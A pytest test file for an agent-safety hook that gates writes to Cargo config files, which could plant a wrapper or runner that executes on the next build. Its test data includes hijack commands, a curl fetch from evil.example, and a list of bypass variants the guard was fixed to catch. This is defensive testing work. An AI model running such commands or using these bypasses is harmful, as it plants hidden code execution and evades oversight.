"""Cargo config exec-hijack guard: writes to `.cargo/config(.toml)` can plant a
rustc-wrapper/linker/runner/credential-provider that Cargo executes on the next
build/test/run. Gated on path alone; default mode ask, human-escapable only."""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

RULE = "cargo-config-exec-protect"
EMPTY = Policy()
DENY = Policy(cargo_config_exec={"mode": "deny"})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _file(tool, path, **kw):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path, **kw})


def _rule(ev, pol=EMPTY):
    d = evaluate(ev, pol)
    return d.rule == RULE, d


PATHS = [".cargo/config.toml", ".cargo/config", "/repo/sub/.cargo/config.toml",
         "/home/u/.cargo/config.toml", "C:\\Users\\u\\.cargo\\config.toml",
         "./.cargo//config.toml"]


@pytest.mark.parametrize("path", PATHS)
@pytest.mark.parametrize("tool", ["Edit", "Write", "MultiEdit"])
def test_file_write_asks(tool, path):
    hit, d = _rule(_file(tool, path))
    assert hit and d.action == Action.ASK


def test_value_only_edit_still_gated():
    ev = _file("Edit", ".cargo/config.toml", old_string='"sccache"', new_string='"/tmp/x"')
    assert _rule(ev)[0]


def test_deny_mode():
    hit, d = _rule(_file("Write", ".cargo/config.toml"), DENY)
    assert hit and d.action == Action.DENY


def test_mcp_write_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    args={"path": ".cargo/config.toml", "content": "x"})
    assert _rule(ev)[0]


@pytest.mark.parametrize("cmd", [
    "echo '[build]\nrustc-wrapper=\"/tmp/x\"' >> .cargo/config.toml",
    "printf 'x' > ~/.cargo/config.toml",
    "sed -i 's/sccache/\\/tmp\\/x/' .cargo/config.toml",
    "tee .cargo/config < payload",
    "mv payload .cargo/config.toml",
    "ln -sf /tmp/payload .cargo/config.toml",
    "cat > '.cargo/config.toml' <<EOF\nx\nEOF",
])
def test_shell_writes_gated(cmd):
    assert _rule(_shell(cmd))[0]


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
    assert d.rule == "fetch-to-file-protect" and d.action == Action.ASK


@pytest.mark.parametrize("ev", [
    _shell("cat .cargo/config.toml"),
    _shell("cargo build --release"),
    _shell("echo hi > notes.txt"),
    _shell("# note: .cargo/config.toml\necho hi > notes.txt"),
    _file("Edit", "Cargo.toml"),
    _file("Write", "src/cargo_config.rs"),
    _file("Write", "docs/.cargo-config.md"),
    _file("Edit", ".cargo/bin/tool.sh"),
    _file("Edit", "mycargo/config.toml"),
])
def test_benign_not_gated(ev):
    assert not _rule(ev)[0]


def test_human_escape_shell():
    assert not _rule(_shell("echo x > .cargo/config.toml  # aegis-allow"))[0]


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_CONFIG_EXEC", "1")
    assert not _rule(_file("Write", ".cargo/config.toml"))[0]


def test_policy_allow():
    pol = Policy(cargo_config_exec={"allow": [r"vendored/\.cargo"]})
    assert not _rule(_file("Write", "vendored/.cargo/config.toml"), pol)[0]
    assert _rule(_file("Write", ".cargo/config.toml"), pol)[0]


def test_off_and_monitor():
    assert not _rule(_file("Write", ".cargo/config.toml"),
                     Policy(cargo_config_exec={"mode": "off"}))[0]
    assert not _rule(_file("Write", ".cargo/config.toml"),
                     Policy(cargo_config_exec={"mode": "monitor"}))[0]


@pytest.mark.parametrize("cmd", [
    "echo x >.cargo/config.toml", "echo x>.cargo/config.toml", "(echo x)>.cargo/config",
    "install -m644 p .cargo/config.toml", "rsync p .cargo/config.toml",
    "git checkout other -- .cargo/config.toml", "git apply p.diff; echo .cargo/config.toml",
    "patch .cargo/config.toml p", "echo x | sponge .cargo/config.toml",
    "ln -s /tmp/p .cargo/config.toml", "touch .cargo/config.toml",
    "New-Item .cargo/config.toml", "[IO.File]::WriteAllText('.cargo/config.toml','x')",
    "python3 - <<'E'\nopen('.cargo/config.toml','w').write('x')\nE",
    "echo x > $CARGO_HOME/config.toml", "echo x > ${CARGO_HOME}/config",
    "unlink .cargo/config.toml",
])
def test_round2_bypasses_closed(cmd):
    assert _rule(_shell(cmd))[0]


@pytest.mark.parametrize("path", ["$CARGO_HOME/config.toml", "${CARGO_HOME}/config"])
def test_cargo_home_var_file_write(path):
    assert _rule(_file("Write", path))[0]


def test_shell_deny_policy_and_env(monkeypatch):
    cmd = "echo x > .cargo/config.toml"
    assert _rule(_shell(cmd), DENY)[1].action == Action.DENY
    assert not _rule(_shell(cmd), Policy(cargo_config_exec={"allow": [r"\.cargo"]}))[0]
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_CONFIG_EXEC", "1")
    assert not _rule(_shell(cmd))[0]
